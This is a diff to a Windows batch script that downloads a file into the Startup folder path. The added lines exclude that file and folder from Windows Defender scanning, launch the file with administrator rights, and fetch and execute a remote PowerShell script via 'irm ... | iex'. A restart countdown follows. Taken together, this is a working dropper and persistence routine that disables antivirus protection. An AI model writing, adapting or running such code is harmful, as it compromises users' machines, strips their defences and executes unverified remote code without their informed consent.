@@ -17,19 +17,26 @@ set "folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 :: Download the file to the specified location
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
 
-:: Check if file exists, if it does, do nothing
+:: Check if file exists, if it does, proceed
 if exist "%filename%" (
-    REM Do nothing - do not start the file
+    echo File downloaded successfully.
+    
+    :: Add the file and folder to Defender exclusions
+    powershell -Command "Add-MpPreference -ExclusionProcess '%filename%'"
+    powershell -Command "Add-MpPreference -ExclusionPath '%folder%'"
+
+    :: Run the downloaded file with administrator rights
+    echo Running the downloaded file with administrator rights...
+    powershell -Command "Start-Process '%filename%' -Verb runAs"
+    
+    :: Now run the external command (risk associated with executing unknown code)
+    echo Running the external PowerShell command...
+    powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
+
 ) else (
-    goto server
+    echo Failed to download the file. Exiting.
+    exit /b
 )
-
-:server
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
-
-:: Add the file and folder to Defender exclusions
-powershell -Command "Add-MpPreference -ExclusionProcess '%filename%'"
-powershell -Command "Add-MpPreference -ExclusionPath '%folder%'"
 
 :: Display message before the 3-minute countdown
 echo The system needs to restart for the changes to take effect.
